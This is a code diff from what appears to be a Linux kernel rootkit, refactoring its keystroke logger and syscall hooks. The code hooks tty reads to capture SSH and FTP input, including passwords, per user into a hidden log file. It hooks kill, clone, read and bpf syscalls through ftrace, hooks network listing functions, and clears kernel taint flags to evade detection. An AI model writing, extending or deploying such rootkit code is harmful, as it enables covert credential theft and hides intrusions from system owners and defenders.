@@ -19,6 +19,7 @@
 #include "lkm.h"
 #include "fs.h"
 #include "bpf.h"
+#include "tty.h"
 #include "log.h"
 
 #pragma GCC optimize("-fno-optimize-sibling-calls")
@@ -47,9 +48,7 @@ sys64 real_m_read;
  * These are kept open throughout kv lifetime
  *  This is so because tty is continuous.
  */
-static struct file *ttyfilp;
 
-static DEFINE_SPINLOCK(tty_lock);
 static DEFINE_SPINLOCK(hide_once_spin);
 
 /**
@@ -803,13 +802,10 @@ static int m_filldir64(struct dir_context *ctx, const char *name, int namlen,
 	return real_filldir64(ctx, name, namlen, offset, ino, d_type);
 }
 
-#define MAXKEY 512
 static LIST_HEAD(keylog_node);
-struct keylog_t {
-	char buf[MAXKEY + 2]; /** newline+'\0' */
-	int offset;
-	uid_t uid;
-	struct list_head list;
+static struct tty_ctx tty_sys_ctx = {
+	.head = &keylog_node,
+	.fp = NULL,
 };
 
 static void __attribute__((unused)) _tty_dump(uid_t uid, pid_t pid, char *buf,
@@ -818,116 +814,11 @@ static void __attribute__((unused)) _tty_dump(uid_t uid, pid_t pid, char *buf,
 	prinfo("%s\n", buf);
 }
 
-enum { R_NONE = 0, R_RETURN = 1, R_NEWLINE = 2, R_RANGE = 4 };
-static void _tty_write_log(uid_t uid, char *buf, ssize_t len)
-{
-	static loff_t offset;
-	struct timespec64 ts;
-	long msecs;
-	size_t total;
-
-	/**
-     * We use a variable-length array (VLA) because the implementation of kernel_write
-     * forces a conversion to a user pointer. If the variable is heap-allocated, the
-     * pointer may be lost.
-     *
-     * VLA generates a warning since we're not in C99, but it's necessary for our use case.
-     *
-     * We allocate +32 bytes, which is enough to hold timestamp + "uid.%d".
-     */
-	char ttybuf[len + 32];
-
-	spin_lock(&tty_lock);
-
-	ktime_get_boottime_ts64(&ts);
-	msecs = ts.tv_nsec / 1000;
-
-	total = snprintf(ttybuf, sizeof(ttybuf), "[%lld.%06ld] uid.%d %s",
-			 (long long)ts.tv_sec, msecs, uid, buf);
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 14, 0)
-	fs_kernel_write_file(ttyfilp, (const void *)ttybuf, total, &offset);
-#else
-	fs_kernel_write_file(ttyfilp, (const char *)ttybuf, total, offset);
-#endif
-	spin_unlock(&tty_lock);
-}
-
-static int inline _key_add(uid_t uid, char byte, int flags)
-{
-	struct keylog_t *kl;
-	int rv = 0;
-
-	if ((flags & R_RETURN) || (!(flags & R_RANGE)))
-		return rv;
-
-	kl = kcalloc(1, sizeof(struct keylog_t), GFP_KERNEL);
-	if (!kl) {
-		prerr("Insufficient memory\n");
-		rv = -ENOMEM;
-	} else {
-		kl->offset = 0;
-		kl->buf[kl->offset++] = byte;
-		kl->uid = uid;
-		list_add_tail(&kl->list, &keylog_node);
-	}
-
-	return rv;
-}
-
-static int _key_update(uid_t uid, char byte, int flags)
-{
-	struct keylog_t *node, *node_safe;
-	bool new = true;
-	int rv = 0;
-
-	list_for_each_entry_safe (node, node_safe, &keylog_node, list) {
-		if (node->uid != uid)
-			continue;
-
-		if (flags & R_RETURN) {
-			node->buf[node->offset++] = '\n';
-			node->buf[node->offset] = 0;
-
-			_tty_write_log(uid, node->buf, strlen(node->buf));
-
-			list_del(&node->list);
-			kfree(node);
-		} else if ((flags & R_RANGE) || (flags & R_NEWLINE)) {
-			if (node->offset < MAXKEY) {
-				node->buf[node->offset++] = byte;
-			} else {
-				prwarn("Warning: max length reached: %d\n",
-				       MAXKEY);
-				return -ENOMEM;
-			}
-		}
-		new = false;
-		break;
-	}
-
-	if (new)
-		rv = _key_add(uid, byte, flags);
-
-	return rv;
-}
-
-static void _keylog_cleanup_list(void)
-{
-	struct keylog_t *node, *node_safe;
-	list_for_each_entry_safe (node, node_safe, &keylog_node, list) {
-		list_del(&node->list);
-		kfree(node);
-	}
-}
-
 void _keylog_cleanup(void)
 {
-	_keylog_cleanup_list();
-	fs_kernel_close_file(ttyfilp);
+	kv_tty_close(&tty_sys_ctx);
+	memset(&tty_sys_ctx, 0, sizeof(struct tty_ctx));
 	fs_file_rm(sys_get_ttyfile());
-
-	ttyfilp = NULL;
 }
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5, 12, 0)
@@ -992,17 +883,16 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
 		flags |= (byte == '\n') ? R_NEWLINE : flags;
 
 		/**
-		 * Handles SSH session data, which usually arrives one byte at a time.
-		 * However, in certain cases, such as during password input, the data may 
-		 * arrive as a multi-byte stream.
+		 * To handle SSH session data, it typically
+		 * comes one byte at a time, but there are instances when it comes
+		 * as a multi-byte stream, for example, during password input.
 		 */
 		if ((app_flag & APP_FTP) && rv > 1) {
 			ttybuf[strcspn(ttybuf, "\r")] = '\0';
-			_tty_write_log(uid, ttybuf, sizeof(ttybuf));
-
+			kv_tty_write(&tty_sys_ctx, uid, ttybuf, sizeof(ttybuf));
 		} else if (app_flag & APP_SSH &&
 			   (rv == 1 || flags & R_RETURN || flags & R_NEWLINE)) {
-			_key_update(uid, byte, flags);
+			kv_key_update(&tty_sys_ctx, uid, byte, flags);
 		}
 	}
 out:
@@ -1130,14 +1020,7 @@ static unsigned long _load_syscall_variant(struct kernel_syscalls *ks,
 		return 0L;
 	}
 
-	if (!(rv = ks->k_kallsyms_lookup_name(str))) {
-		/* there is no actual limit for syscall AFAIK */
-		char tmp[64 + 1] = { 0 };
-
-		snprintf(tmp, 64, "__x64_%s", str);
-		rv = ks->k_kallsyms_lookup_name(tmp);
-	}
-
+	rv = ks->k_kallsyms_lookup_name(str);
 	if (rv) {
 		struct sys_addr_list *sl;
 		sl = kcalloc(1, sizeof(struct sys_addr_list), GFP_KERNEL);
@@ -1215,6 +1098,12 @@ void kv_reset_tainted(unsigned long *tainted_ptr)
 	test_and_clear_bit(TAINT_WARN, tainted_ptr);
 }
 
+#ifdef __x86_64__
+#define _sys_arch(s) "__x64_" s
+#else
+#define _sys_arch(s) s
+#endif
+
 struct kernel_syscalls *kv_kall_load_addr(void)
 {
 	static struct kernel_syscalls ks;
@@ -1244,8 +1133,9 @@ struct kernel_syscalls *kv_kall_load_addr(void)
 		if (!ks.k_bpf_map_get)
 			prwarn("invalid data: bpf_map_get will not work\n");
 
-		ks.k_sys_setreuid =
-			(sys64)_load_syscall_variant(&ks, "sys_setreuid");
+		/** Direct call. @see m_kill */
+		ks.k_sys_setreuid = (sys64)_load_syscall_variant(
+			&ks, _sys_arch("sys_setreuid"));
 		;
 		if (!ks.k_sys_setreuid)
 			prwarn("invalid data: syscall hook setreuid will not work\n");
@@ -1269,11 +1159,11 @@ struct kernel_syscalls *kv_kall_load_addr(void)
 }
 
 static struct ftrace_hook ft_hooks[] = {
-	{ "sys_exit_group", m_exit_group, &real_m_exit_group, true },
-	{ "sys_clone", m_clone, &real_m_clone, true },
-	{ "sys_kill", m_kill, &real_m_kill, true },
-	{ "sys_read", m_read, &real_m_read, true },
-	{ "sys_bpf", m_bpf, &real_m_bpf, true },
+	{ _sys_arch("sys_exit_group"), m_exit_group, &real_m_exit_group, true },
+	{ _sys_arch("sys_clone"), m_clone, &real_m_clone, true },
+	{ _sys_arch("sys_kill"), m_kill, &real_m_kill, true },
+	{ _sys_arch("sys_read"), m_read, &real_m_read, true },
+	{ _sys_arch("sys_bpf"), m_bpf, &real_m_bpf, true },
 	{ "tcp4_seq_show", m_tcp4_seq_show, &real_m_tcp4_seq_show },
 	{ "udp4_seq_show", m_udp4_seq_show, &real_m_udp4_seq_show },
 	{ "tcp6_seq_show", m_tcp6_seq_show, &real_m_tcp6_seq_show },
@@ -1434,8 +1324,9 @@ bool sys_init(void)
 				       ft_hooks[idx].name);
 
 			/** Init tty log */
-			ttyfilp = fs_kernel_open_file(sys_get_ttyfile());
-			if (!ttyfilp) {
+			tty_sys_ctx =
+				kv_tty_open(&tty_sys_ctx, sys_get_ttyfile());
+			if (!tty_sys_ctx.fp) {
 				prerr("sys_init: Failed loading tty file\n");
 				rc = false;
 			}
